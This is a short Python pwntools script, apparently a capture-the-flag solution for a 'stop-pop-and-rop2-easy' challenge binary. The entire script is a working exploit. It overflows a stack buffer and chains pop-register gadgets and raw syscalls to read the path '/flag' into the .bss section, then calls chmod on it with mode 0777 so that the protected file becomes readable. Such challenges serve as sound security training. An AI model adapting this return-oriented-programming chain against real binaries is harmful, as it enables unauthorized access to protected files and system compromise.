#!/usr/bin/python3

import time
from pwn import *


context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/stop-pop-and-rop2-easy')
rop = ROP(elf)

rbp = 0x7ffd559d6330
input_start = rbp - 0x40
ret = rbp + 0x8
offset = ret - input_start

pop_rdi = rop.find_gadget(["pop rdi","ret"]).address
pop_rsi = rop.find_gadget(["pop rsi","ret"]).address
pop_rax = rop.find_gadget(["pop rax","ret"]).address
pop_rdx = rop.find_gadget(["pop rdx","ret"]).address
syscall = rop.find_gadget(["syscall","ret"]).address
ret = rop.find_gadget(["ret"]).address
#0x0000000000401209 : push rax ; add dil, dil ; loopne 0x401275 ; nop ; ret


payload = b"A" * offset 
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rsi) + p64(elf.bss() + 0x200)
payload += p64(pop_rdx) + p64(7)
payload += p64(syscall)
payload += p64(pop_rdi) + p64(elf.bss() + 0x200) 
payload += p64(pop_rax) + p64(90)
payload += p64(pop_rsi) + p64(511)
payload += p64(syscall)

io = process()

io.send(payload)
time.sleep(1)
io.send(b"/flag")

io.interactive()
